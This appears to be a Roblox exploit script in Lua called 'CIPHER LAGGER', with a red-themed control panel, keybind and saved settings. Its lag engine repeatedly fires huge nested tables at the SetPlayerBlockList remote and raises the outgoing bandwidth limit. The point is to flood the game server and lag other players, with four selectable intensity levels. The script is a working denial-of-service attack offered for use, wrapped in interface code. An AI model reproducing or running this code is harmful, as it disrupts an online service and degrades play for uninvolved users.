--[[
    CIPHER LAGGER - CATALYST STYLE (RED THEME)
    - Name: CIPHER LAGGER
    - GUI Size: 200x100
    - Larger Toggles: V1-V4 (45x26)
    - Larger Switch: 62x25
    - Layout: IMAGE & LOCK at top right
    - Colors: Pure Red & Dark Maroon
]]--

--// SERVICES
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local SoundService = game:GetService("SoundService")

local player = Players.LocalPlayer
local ConfigFile = "CipherLaggerConfig.json"

-- ⚙️ NIVELES Y PODERES
local NIVELES = {
    Low   = { poder = 18, texto = "SPEED 50-25" },
    Mid   = { poder = 24, texto = "SPEED 45-23" },
    High  = { poder = 30, texto = "SPEED 40-17" },
    Ultra = { poder = 78, texto = "ONLY TRYHARD" }
}

-- 🎨 ESTILO CATALYST (COLORES ROJOS)
local UI_CONFIG = {
    MainBg       = Color3.fromRGB(15, 0, 0),
    TitleColor   = Color3.fromRGB(255, 0, 0),
    TextColor    = Color3.fromRGB(255, 0, 0),
    ButtonInact  = Color3.fromRGB(40, 0, 0),
    ButtonAct    = Color3.fromRGB(255, 0, 0),
    ToggleOff    = Color3.fromRGB(40, 0, 0),
    ToggleOn     = Color3.fromRGB(255, 0, 0),
    LockColor    = Color3.fromRGB(255, 0, 0),
    Font         = Enum.Font.GothamBlack,
    BorderColor  = Color3.fromRGB(100, 0, 0),
}

local keybind = Enum.KeyCode.M
local listeningForInput = false
local laggerActive = false
local lagThread = nil
local nivelActual = "Low"
local ventanaBloqueada = false
local selectedBackground = "88965053360791"

-- 💾 CONFIG
local function SaveConfig()
    local data = {
        Keybind = keybind.Name,
        Nivel = nivelActual,
        Bloqueado = ventanaBloqueada,
        BackgroundId = selectedBackground
    }
    pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
end

local function LoadConfig()
    if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
        pcall(function()
            local data = HttpService:JSONDecode(readfile(ConfigFile))
            keybind = Enum.KeyCode[data.Keybind] or Enum.KeyCode.M
            nivelActual = data.Nivel or "Low"
            ventanaBloqueada = data.Bloqueado or false
            selectedBackground = tostring(data.BackgroundId or "88965053360791")
        end)
    end
end
LoadConfig()

-- ⚠️ LAG ENGINE
local function bomb(poder)
    local main, spam = {}, {{}}
    local z = spam[1]
    for i = 1, 25 do local t = {} table.insert(z, t) z = t end
    local max = math.min(12000, poder * 50)
    for i = 1, max do table.insert(main, spam) end
    pcall(function() game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) end)
end

local function restartLagWithPower(poder)
    if laggerActive then
        if lagThread then 
            task.cancel(lagThread) 
            lagThread = nil 
        end
        lagThread = task.spawn(function()
            while laggerActive do
                pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
                bomb(poder)
                task.wait(0.18)
            end
        end)
    end
end

-- 🧩 ELEMENTOS
local toggleButton, btnLow, btnMid, btnHigh, btnUltra, lockButton, imgsButton
local titleLabel, textEnable, keybindButton, textLagger
local infoLabel, backgroundImage

local function actualizarBotonesNivel()
    local btns = {Low = btnLow, Mid = btnMid, High = btnHigh, Ultra = btnUltra}
    for k, b in pairs(btns) do
        if b then
            if nivelActual == k then
                b.BackgroundColor3 = UI_CONFIG.ButtonAct
                b.TextColor3 = Color3.fromRGB(255, 255, 255)
            else
                b.BackgroundColor3 = UI_CONFIG.ButtonInact
                b.TextColor3 = Color3.fromRGB(255, 0, 0)
            end
        end
    end
    
    if laggerActive then
        restartLagWithPower(NIVELES[nivelActual].poder)
    end
end

local function actualizarSwitch()
    if toggleButton then
        toggleButton.Text = laggerActive and "ON" or "OFF"
        toggleButton.BackgroundColor3 = laggerActive and UI_CONFIG.ToggleOn or UI_CONFIG.ToggleOff
        toggleButton.TextColor3 = laggerActive and Color3.fromRGB(255,255,255) or Color3.fromRGB(255, 0, 0)
    end
end

local function actualizarCandado()
    if lockButton then
        if ventanaBloqueada then
            lockButton.Text = "LOCK"
            lockButton.TextColor3 = Color3.fromRGB(150, 0, 0)
        else
            lockButton.Text = "UNLOCK"
            lockButton.TextColor3 = UI_CONFIG.LockColor
        end
    end
end

local function actualizarKeybindButton()
    if keybindButton then
        local display = keybind.Name:gsub("Button", "")
        keybindButton.Text = display
    end
end

local function toggleLagger()
    laggerActive = not laggerActive
    actualizarSwitch()

    if laggerActive then
        if lagThread then task.cancel(lagThread) end
        lagThread = task.spawn(function()
            while laggerActive do
                pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
                bomb(NIVELES[nivelActual].poder)
                task.wait(0.18)
            end
        end)
    else
        if lagThread then task.cancel(lagThread); lagThread = nil end
    end
end

-- 🖼️ INTERFAZ
if CoreGui:FindFirstChild("CipherLagger_UI") then CoreGui.CipherLagger_UI:Destroy() end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "CipherLagger_UI"
screenGui.Parent = CoreGui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false

-- Panel principal: 200 x 100
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.BackgroundColor3 = UI_CONFIG.MainBg
mainFrame.BorderSizePixel = 1
mainFrame.BorderColor3 = UI_CONFIG.BorderColor
mainFrame.Size = UDim2.new(0, 200, 0, 100)
mainFrame.Position = UDim2.new(0.5, -100, 0.5, -50)
mainFrame.Parent = screenGui
mainFrame.ClipsDescendants = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 8)

-- Imagen de fondo
backgroundImage = Instance.new("ImageLabel")
backgroundImage.Name = "BackgroundImage"
backgroundImage.Parent = mainFrame
backgroundImage.BackgroundTransparency = 1
backgroundImage.BorderSizePixel = 0
backgroundImage.Size = UDim2.new(1, 0, 1, 0)
backgroundImage.Image = "rbxassetid://" .. selectedBackground
backgroundImage.ScaleType = Enum.ScaleType.Crop
backgroundImage.ImageTransparency = 0.5
backgroundImage.ZIndex = 0
Instance.new("UICorner", backgroundImage).CornerRadius = UDim.new(0, 8)

-- ═══════════════════════════════════════════
-- TOP ROW: TITLE | IMAGE | LOCK
-- ═══════════════════════════════════════════
titleLabel = Instance.new("TextLabel", mainFrame)
titleLabel.BackgroundTransparency = 1
titleLabel.Position = UDim2.new(0, 8, 0, 2)
titleLabel.Size = UDim2.new(0, 90, 0, 24)
titleLabel.Font = UI_CONFIG.Font
titleLabel.Text = "CIPHER LAGGER"
titleLabel.TextColor3 = UI_CONFIG.TitleColor
titleLabel.TextSize = 11
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.ZIndex = 3

lockButton = Instance.new("TextButton", mainFrame)
lockButton.Name = "LockButton"
lockButton.BackgroundTransparency = 1
lockButton.Position = UDim2.new(1, -42, 0, 2)
lockButton.Size = UDim2.new(0, 38, 0, 24)
lockButton.Font = UI_CONFIG.Font
lockButton.Text = "UNLOCK"
lockButton.TextColor3 = UI_CONFIG.LockColor
lockButton.TextSize = 9
lockButton.ZIndex = 3
lockButton.MouseButton1Click:Connect(function()
    ventanaBloqueada = not ventanaBloqueada
    actualizarCandado()
    SaveConfig()
end)

imgsButton = Instance.new("TextButton", mainFrame)
imgsButton.Name = "ImgsButton"
imgsButton.BackgroundTransparency = 1
imgsButton.Position = UDim2.new(1, -85, 0, 2)
imgsButton.Size = UDim2.new(0, 42, 0, 24)
imgsButton.Font = UI_CONFIG.Font
imgsButton.Text = "IMAGE"
imgsButton.TextColor3 = UI_CONFIG.LockColor
imgsButton.TextSize = 9
imgsButton.ZIndex = 3

-- ═══════════════════════════════════════════
-- MIDDLE ROW: ENABLE LAGGER | KEYBIND | TOGGLE
-- ═══════════════════════════════════════════
textEnable = Instance.new("TextLabel", mainFrame)
textEnable.BackgroundTransparency = 1
textEnable.Position = UDim2.new(0, 8, 0, 32)
textEnable.Size = UDim2.new(0, 80, 0, 20)
textEnable.Font = UI_CONFIG.Font
textEnable.Text = "ENABLE LAGGER"
textEnable.TextColor3 = UI_CONFIG.TextColor
textEnable.TextSize = 8
textEnable.TextXAlignment = Enum.TextXAlignment.Left
textEnable.ZIndex = 3

keybindButton = Instance.new("TextButton", mainFrame)
keybindButton.BackgroundColor3 = UI_CONFIG.ButtonInact
keybindButton.Position = UDim2.new(0, 92, 0, 32)
keybindButton.Size = UDim2.new(0, 26, 0, 20)
keybindButton.Font = UI_CONFIG.Font
keybindButton.Text = "M"
keybindButton.TextColor3 = Color3.fromRGB(255, 255, 255)
keybindButton.TextSize = 9
keybindButton.ZIndex = 3
Instance.new("UICorner", keybindButton).CornerRadius = UDim.new(0, 4)

toggleButton = Instance.new("TextButton", mainFrame)
toggleButton.Name = "ToggleButton"
toggleButton.BackgroundColor3 = UI_CONFIG.ToggleOff
toggleButton.Position = UDim2.new(1, -70, 0, 30)
toggleButton.Size = UDim2.new(0, 62, 0, 25)
toggleButton.Font = UI_CONFIG.Font
toggleButton.Text = "OFF"
toggleButton.TextColor3 = UI_CONFIG.TextColor
toggleButton.TextSize = 10
toggleButton.ZIndex = 3
Instance.new("UICorner", toggleButton).CornerRadius = UDim.new(0, 12)
toggleButton.MouseButton1Click:Connect(toggleLagger)

-- ═══════════════════════════════════════════
-- BOTTOM ROW: V1 | V2 | V3 | V4
-- ═══════════════════════════════════════════
local btnW = 45
local btnH = 26
local esp = 3
local startX = 5
local btnY = 65

btnLow = Instance.new("TextButton", mainFrame)
btnLow.Size = UDim2.new(0, btnW, 0, btnH)
btnLow.Position = UDim2.new(0, startX, 0, btnY)
btnLow.Font = UI_CONFIG.Font
btnLow.Text = "V1"
btnLow.TextSize = 10
btnLow.ZIndex = 3
Instance.new("UICorner", btnLow).CornerRadius = UDim.new(0, 6)
btnLow.MouseButton1Click:Connect(function() nivelActual = "Low"; actualizarBotonesNivel(); SaveConfig() end)

btnMid = Instance.new("TextButton", mainFrame)
btnMid.Size = UDim2.new(0, btnW, 0, btnH)
btnMid.Position = UDim2.new(0, startX + btnW + esp, 0, btnY)
btnMid.Font = UI_CONFIG.Font
btnMid.Text = "V2"
btnMid.TextSize = 10
btnMid.ZIndex = 3
Instance.new("UICorner", btnMid).CornerRadius = UDim.new(0, 6)
btnMid.MouseButton1Click:Connect(function() nivelActual = "Mid"; actualizarBotonesNivel(); SaveConfig() end)

btnHigh = Instance.new("TextButton", mainFrame)
btnHigh.Size = UDim2.new(0, btnW, 0, btnH)
btnHigh.Position = UDim2.new(0, startX + (btnW + esp) * 2, 0, btnY)
btnHigh.Font = UI_CONFIG.Font
btnHigh.Text = "V3"
btnHigh.TextSize = 10
btnHigh.ZIndex = 3
Instance.new("UICorner", btnHigh).CornerRadius = UDim.new(0, 6)
btnHigh.MouseButton1Click:Connect(function() nivelActual = "High"; actualizarBotonesNivel(); SaveConfig() end)

btnUltra = Instance.new("TextButton", mainFrame)
btnUltra.Size = UDim2.new(0, btnW, 0, btnH)
btnUltra.Position = UDim2.new(0, startX + (btnW + esp) * 3, 0, btnY)
btnUltra.Font = UI_CONFIG.Font
btnUltra.Text = "V4"
btnUltra.TextSize = 10
btnUltra.ZIndex = 3
Instance.new("UICorner", btnUltra).CornerRadius = UDim.new(0, 6)
btnUltra.MouseButton1Click:Connect(function() nivelActual = "Ultra"; actualizarBotonesNivel(); SaveConfig() end)

-- ═══════════════════════════════════════════
-- MENÚ DE IMÁGENES
-- ═══════════════════════════════════════════
local backgroundOptions = {
    {name = "1", id = "93045102280822"},
    {name = "2", id = "103842508538630"},
    {name = "3", id = "76006298196711"},
    {name = "4", id = "123662354834892"},
    {name = "5", id = "93357962442247"}
}
local imgsPanel = Instance.new("Frame", screenGui)
imgsPanel.Name = "ImgsPanel"
imgsPanel.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
imgsPanel.BorderSizePixel = 1
imgsPanel.BorderColor3 = UI_CONFIG.BorderColor
imgsPanel.Size = UDim2.new(0, 270, 0, 176)
imgsPanel.Position = UDim2.new(0.5, -135, 0.5, -88)
imgsPanel.Visible = false
imgsPanel.ZIndex = 50
Instance.new("UICorner", imgsPanel).CornerRadius = UDim.new(0, 10)

local previewsHolder = Instance.new("Frame", imgsPanel)
previewsHolder.BackgroundTransparency = 1
previewsHolder.Position = UDim2.new(0, 8, 0, 30)
previewsHolder.Size = UDim2.new(1, -16, 1, -38)
previewsHolder.ZIndex = 51

local grid = Instance.new("UIGridLayout", previewsHolder)
grid.CellSize = UDim2.new(0, 78, 0, 62)
grid.CellPadding = UDim2.new(0, 7, 0, 7)
grid.HorizontalAlignment = Enum.HorizontalAlignment.Center

for _, option in ipairs(backgroundOptions) do
    local preview = Instance.new("ImageButton", previewsHolder)
    preview.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
    preview.Image = "rbxassetid://" .. option.id
    preview.ScaleType = Enum.ScaleType.Crop
    preview.ZIndex = 52
    Instance.new("UICorner", preview).CornerRadius = UDim.new(0, 6)
    preview.MouseButton1Click:Connect(function()
        selectedBackground = option.id
        backgroundImage.Image = "rbxassetid://" .. selectedBackground
        imgsPanel.Visible = false
        SaveConfig()
    end)
end

imgsButton.MouseButton1Click:Connect(function() imgsPanel.Visible = not imgsPanel.Visible end)

-- 🎮 KEYBIND LISTENER
keybindButton.MouseButton1Click:Connect(function()
    listeningForInput = true
    keybindButton.Text = "?"
    keybindButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
end)

UserInputService.InputBegan:Connect(function(input, gp)
    if listeningForInput and not gp then
        if input.KeyCode ~= Enum.KeyCode.Unknown then
            keybind = input.KeyCode
            actualizarKeybindButton()
            SaveConfig()
            listeningForInput = false
            keybindButton.BackgroundColor3 = UI_CONFIG.ButtonInact
        end
    elseif not gp and input.KeyCode == keybind then
        toggleLagger()
    end
end)

-- ═══════════════════════════════════════════
-- ARRASTRAR
-- ═══════════════════════════════════════════
local isDragging, dragStart, startPos = false, nil, nil
mainFrame.InputBegan:Connect(function(input)
    if not ventanaBloqueada and (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
        isDragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if isDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
mainFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = false
    end
end)

actualizarBotonesNivel()
actualizarSwitch()
actualizarCandado()
actualizarKeybindButton()